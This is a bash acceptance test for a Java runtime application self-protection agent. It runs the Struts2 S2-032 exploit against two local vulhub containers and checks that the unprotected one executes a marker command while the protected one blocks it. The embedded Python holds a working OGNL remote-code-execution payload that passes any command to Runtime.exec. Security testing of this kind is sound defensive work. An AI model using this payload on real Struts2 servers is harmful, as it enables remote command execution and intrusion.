#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_STRUTS2_S2032_IMAGE:-vulhub/struts2:2.3.28}"
baseline_name="${OHMYRASP_VULHUB_STRUTS2_S2032_BASELINE_NAME:-ohmyrasp-vulhub-struts2-s2032-baseline}"
protected_name="${OHMYRASP_VULHUB_STRUTS2_S2032_PROTECTED_NAME:-ohmyrasp-vulhub-struts2-s2032-protected}"
baseline_port="${OHMYRASP_VULHUB_STRUTS2_S2032_BASELINE_PORT:-18576}"
protected_port="${OHMYRASP_VULHUB_STRUTS2_S2032_PROTECTED_PORT:-18577}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-struts2-s2-032-java8-baseline"
protected_dir="logs/vulhub-struts2-s2-032-java8-protected"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-s2032-success"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" -p "${baseline_port}:8080" \
  "$image" >/dev/null

docker run -d --name "$protected_name" -p "${protected_port}:8080" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

wait_for() {
  local name="$1"
  local port="$2"
  local root_status
  local index_status
  for _ in $(seq 1 180); do
    root_status="$(curl -sS -o "/tmp/${name}-root.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" || true)"
    index_status="$(curl -sS -o "/tmp/${name}-index.html" -w "%{http_code}" \
      "http://127.0.0.1:${port}/index.action" || true)"
    if [[ "$root_status" == "200" || "$index_status" == "200" ]]; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Struts2 S2-032 pages at ${port}" >&2
  exit 1
}

get_payload() {
  local port="$1"
  local output="$2"
  python3 - "$port" "$output" "$marker" <<'PY'
import http.client
import sys
import urllib.parse

port = int(sys.argv[1])
output = sys.argv[2]
marker = sys.argv[3]
method = (
    "method:"
    "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
    "%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),"
    "%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),"
    "%23w%3d%23res.getWriter(),"
    "%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),"
    "%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,"
    "%23w.print(%23str),"
    "%23w.close(),"
    "1?%23xx:%23request.toString"
)
params = urllib.parse.urlencode(
    {
        "pp": r"\\A",
        "ppp": " ",
        "encoding": "UTF-8",
        "cmd": "touch " + marker,
    }
)
path = f"/index.action?{method}&{params}"
headers = {"User-Agent": "ohmyrasp-s2-032"}
connection = http.client.HTTPConnection("127.0.0.1", port, timeout=30)
try:
    connection.request("GET", path, headers=headers)
    response = connection.getresponse()
    content = response.read()
finally:
    connection.close()

with open(output, "wb") as handle:
    handle.write(f"PATH {path}\n".encode())
    handle.write(f"HTTP/1.1 {response.status} {response.reason}\n".encode())
    for key, value in response.getheaders():
        handle.write(f"{key}: {value}\n".encode(errors="replace"))
    handle.write(b"\n")
    handle.write(content)
print(response.status)
PY
}

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"

docker exec "$baseline_name" rm -f "$marker" >/dev/null
docker exec "$protected_name" rm -f "$marker" >/dev/null

if ! grep -q '"event":"ohmyrasp-java8-agent-start"' "$protected_log"; then
  cat "$protected_log" >&2 || true
  echo "missing Java 8 startup event in Struts2 S2-032 protected container" >&2
  exit 1
fi
if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "Struts2 S2-032 protected startup/readiness produced a detection before the exploit request" >&2
  exit 1
fi

baseline_status="$(get_payload "$baseline_port" "${baseline_dir}/attack.response")"
if [[ "$baseline_status" != "200" ]] || ! docker exec "$baseline_name" test -e "$marker"; then
  sed -n '1,200p' "${baseline_dir}/attack.response" >&2 || true
  echo "baseline Struts2 S2-032 DMI method-name OGNL did not create ${marker}; status=${baseline_status}" >&2
  exit 1
fi

protected_status="$(get_payload "$protected_port" "${protected_dir}/attack.response")"
if [[ "$protected_status" != "500" ]]; then
  sed -n '1,200p' "${protected_dir}/attack.response" >&2 || true
  echo "protected Struts2 S2-032 did not return the block exception response; status=${protected_status}" >&2
  exit 1
fi
if docker exec "$protected_name" test -e "$marker"; then
  echo "protected Struts2 S2-032 created ${marker} despite Java8 RASP; status=${protected_status}" >&2
  exit 1
fi
for _ in $(seq 1 30); do
  if grep -q '"algorithm":"java8_command_execution_exploit_primitive".*"action":"block"' "$protected_log"; then
    echo "vulhub Struts2 S2-032 Java8 acceptance passed"
    exit 0
  fi
  sleep 1
done

cat "$protected_log" >&2
echo "missing java8_command_execution_exploit_primitive block event for Struts2 S2-032" >&2
exit 1
